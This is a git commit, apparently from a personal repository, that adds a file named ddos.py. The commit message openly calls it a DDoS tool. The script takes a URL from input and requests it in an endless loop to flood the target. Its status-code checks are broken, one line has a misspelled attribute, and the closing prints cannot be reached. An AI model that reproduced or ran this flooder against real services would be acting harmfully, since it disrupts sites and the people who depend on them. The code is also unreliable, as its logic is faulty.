72196a3066f42c5d2ef02953d1f685a5032993e2
mystic-poop <enesyildiz320@icloud.com>
2025-03-31 16:03:40 +0300

    The ddos tool
    i forgot to upload that shit so oops

---
+++ ddos.py
@@ -0,0 +1,8 @@
+import requests
+gonnacooked = input()
+while  True:
+    ddos = requests.get(gonnacooked)
+    if ddos.status_code: 400 or 500
+print("bro got absoloutley cooked")
+if ddos.staus_code: 403
+print ("oh shit were caught on 4K")
